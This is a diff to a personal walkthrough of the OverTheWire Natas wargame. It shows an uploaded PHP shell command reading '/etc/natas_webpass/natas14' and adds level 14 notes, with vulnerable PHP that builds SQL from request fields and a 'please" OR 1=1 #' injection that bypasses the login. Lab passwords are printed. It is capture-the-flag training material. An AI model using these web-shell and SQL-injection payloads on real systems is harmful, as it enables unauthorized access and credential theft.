@@ -205,3 +205,26 @@ The file <a href="upload/tnmjsvarti.php">upload/tnmjsvarti.php</a> has been uplo
 // We can now access data through :
 response = session.get(url + 'upload/tnmjsvarti.php?c= cat /etc/natas_webpass/natas14', auth = (username, password))
 Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+lvl 14 --> lvl 15
+http://natas14.natas.labs.overthewire.org/
+natas14
+Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+// The point of this level is to realise a SQL injection as the code shows direct SQL queries with variables in it controlled directly by the user
+// See the code
+$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""; 
+    if(array_key_exists("debug", $_GET)) { 
+        echo "Executing query: $query<br>"; 
+    } 
+// 
+// As it concatinates using double quotes "", we can try to break the code using '"'
+response = session.post(url, data = {"username": 'please"', "password": "subscribe"}, auth=(username, password))
+response = session.post(url, data = {"username": 'please" hello holy molly', "password": "subscribe"}, auth=(username, password))
+// See the returned code
+Executing query: SELECT * from users where username="please" hello holy molly" and password="subscribe"<br><br />
+// "
+// Now that we know that there is a SQL vulnerability, lets inject correct SQL queries
+response = session.post(url, data = {"username": 'please" OR 1=1 #', "password": "subscribe"}, auth=(username, password))
+// the pound # makes the reste of the query unmarked 
+//  OR 1=1 means OR everything returns true 
+AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J<br><div
